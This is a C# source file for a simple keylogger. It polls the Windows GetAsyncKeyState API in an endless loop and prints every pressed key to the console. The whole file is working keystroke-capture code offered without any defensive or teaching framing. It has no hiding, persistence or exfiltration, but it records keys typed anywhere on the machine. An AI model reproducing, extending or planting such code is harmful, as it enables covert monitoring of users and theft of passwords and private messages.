using System;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms; // include reference

namespace KeyLogger
{
    class Program
    {
        [DllImport("user32.dll")]
        public static extern int GetAsyncKeyState(Int32 i);
        static void Main(string[] args)
        {
            StartLogging();
        }

        static void StartLogging()
        {
            while (true)
            {
                //sleeping for while, this will reduce load on cpu
                Thread.Sleep(10);
                for (Int32 i = 0; i < 255; i++)
                {
                    int keyState = GetAsyncKeyState(i);
                    if (keyState == 1 || keyState == -32767)
                    {
                        Console.WriteLine((Keys)i);
                        break;
                    }
                }
            }
        }
    }
}